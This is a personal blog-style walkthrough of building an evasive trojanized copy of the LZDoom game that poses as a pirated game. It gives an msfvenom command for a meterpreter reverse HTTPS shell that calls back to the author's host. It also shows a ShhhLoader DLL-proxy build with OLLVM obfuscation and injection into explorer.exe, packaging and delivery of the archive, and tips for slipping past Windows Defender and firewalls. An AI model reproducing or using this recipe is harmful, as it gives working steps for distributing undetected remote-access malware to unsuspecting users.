# My weekend dive into evasive malware 

So, I've been playing with a bunch of different tools recently just for fun, and figured I'd try to put together something to illustrate how I go about building evasive malware payloads. 

## Nature of the project 

What I ended up going for was to simulate a typical malware-laden pirated game. For this purpose, I utilized the open source game engine LZDoom with the FreeDoom WAD so that I would have a base piece of software to trojanize that would be similarly complex to a commercial game. 

In order to accomplish this, I utilized several off the shelf tools. 

- msfvenom and meterpreter for a shellcode payload. 
- shhhloader for AV evasion and shellcode loading. 

...and that's really it. 

## Building out my payload shellcode 

This was a pretty basic msfvenom job. In order to be maximally evasive, I wanted to use a reverse HTTPS shell, and for compatibility with ShhhLoader, I output it as raw x64 shellcode. Here's the command line: 

```

msfvenom -p windows/x64/meterpreter/reverse_https LPORT=443 LHOST=[my IP] -f raw > shellcode.raw 

```

Not much to it! 

## Reconning for DLL proxying 

In order to make my final malware package look legit, I needed a way to launch my payload while also preserving the functionality of LZDoom so that the hypothetical victim wouldn't suspect that he's just run a busted piece of malware. I had a couple options: 

1. Trojanize the application with assembly. I don't quite know how to do this, so...I didn't. 
2. Write a loader application in C to call both the application executable and a payload executable. This seems pretty jank, though, so I didn't do it. 
3. Use MSFVenom to build out a backdoored EXE. This would break my ability to use ShhhLoader down the road, though. 
4. DLL proxying. Bingo! 

DLL proxying is effectively where one makes a malicious DLL that contains your payload, but also loads functions in from a legitimate DLL in order to preserve the legitimate DLL's functionality. In effect, it *proxies* the legitimate functions from the legitimate DLL through a malicious DLL that effectively serves as a malicious man in the middle between the calling EXE and the DLL it relies on. 

In order to do this, we need to identify a DLL that the application loads, and then we can use ShhhLoader along with a copy of the legitimate DLL to build a DLL proxy payload. 

LZDoom comes with several DLLs to provide various functionalities, e.g. SDL.dll for graphics, libfluidsynth for midi playback, etc. However, not all of the included DLLs with the game are necessarily loaded when the game is run in it's default configuration. In order to discover which DLL would actually be used by the application and thus be a good candidate for proxying, I had to do a bit of recon. This was accomplished simply enough by downloading a legitimate copy of LZDoom to my Windows 10 test VM, and then simply running it and inspecting which DLLs the game loaded. 

To inspect the loaded DLLs, I simply used the task manager -> performance, and then opened the resource monitor by clicking the link at the bottom of the application window labeled "Open Resource Monitor" (this can also be simply searched for in the start menu under "resource monitor"). In the resource monitor, I could then select the LZDoom process and see which DLLs it had loaded. 

I identified libfluidsynth (the midi sound library) as a good candidate for proxying. 

## Building out my proxied DLL with ShhhLoader 

ShhhLoader is an excellent tool for creating evasive payloads that utilize the SysWhispers method of direct syscalls to avoid detection by the API hooks used by many anti-virus solutions. If I recall correctly, this works by effectively reimplementing the ntdll.dll win32 API calls as direct syscalls to the NT Native API calls used by the OS kernel. By doing this, the API hooks (which usually inspect the userland win32 API calls and not the NT Native API calls) are unable to detect malicious activity performed by the payload. More information about this can be found on that project's github. 

In order to use ShhhLoader to it's full extent, please consult the install instructions on that project's page, and *be sure to install OLLVM* support so that you can enable obsfucated payload compilation. This feature can make or break whether AV is able to detect the payload or not! 

Either way, to build out the DLL proxy payload, I had to get a copy of the legitimate fluidsynth DLL that was included with LZDoom and rename it to something that would seem legitimate. This was originally called libfluidsynth64.dll, so I renamed it libfluidsynth64_dev.dll. Dev versions of libraries are usually used for when one needs to compile against that library, so it seems like it would be a perfectly legitimate name...

Following this, I built out the payload as follows: 

```

./Shhhloader.py -l -ns -dp libfluidsynth64_dev.dll -p explorer.exe -o libfluidsynth64.dll shellcode.raw 

```

Breaking it down, what I did was: 

|Flag|Description|
|-|-|
|-l|Use OLLVM for obsfucated compilation|
|-ns|No sandbox evasion. This defaults to sleep evasion, and I'm impatient. It also hasn't been necessary in most of my testing with ShhhLoader.|
|-dp libfluidsynth64_dev.dll|Create a DLL proxy payload that proxies functions from libfluidsynth64_dev.dll (the legitimate DLL)|
|-p explorer.exe|Do process injection into explorer.exe. This could have been anything, and I often also use spoolsv.exe when targeting workstations since the print spooler will also likely be running.|
|-o libfluidsynth64.dll|Output the malicious DLL as libfluidsynth64.dll|
|shellcode.raw|The raw meterpreter shellcode we generated earlier and want to use as a payload|


## Packaging and delivery 

From here, turning this into a functional and distributable malware package was fairly simple. I just copied my malicious DLL and the renamed legitimate DLL into the application directory for LZDoom (which is portable), zipped it up and served it over a python3 http server. 

On my test victim VM, I was able to successfully download this archive, and run the game with no issues (although, LZDoom is an unsigned EXE, so Windows did complain a bit to try and prevent me from running it). As soon as the midi synthesizer in the game fired up, I was able to catch a reverse HTTPS shell back on my attack machine. 

This was able to avoid detection by 100% updated Windows Defender (as of Feb 2023) with both real time detection and cloud supported defense enabled. 

## Caveats 

- ShhhLoader can only generate 64 bit payloads. If you want/need to backdoor a 32 bit app using it, different methods will need to be used. 
- Just because you can get a shell to pop and do some rudimentary rooting around in the filesystem without setting off AV, this does not mean that you can do anything with absolute impunity! Trying to load additional malware that is *not* similarly obsfucated will likely result in a detection, as will bad behavioural actions such as trying to modify the registry for the purpose of exploiting the fodhelper UAC Bypass, etc. You still need to keep on your toes about defense evasion to go from this simple example to a fully rooted victim.
- Be sure to encrypt the network connection by using an HTTPS shell or similar. Doing this with an unencrypted network connection will almost certainly get flagged by the firewall, especially with a staged payload, since the plaintext shell will be running around in the tubes. 








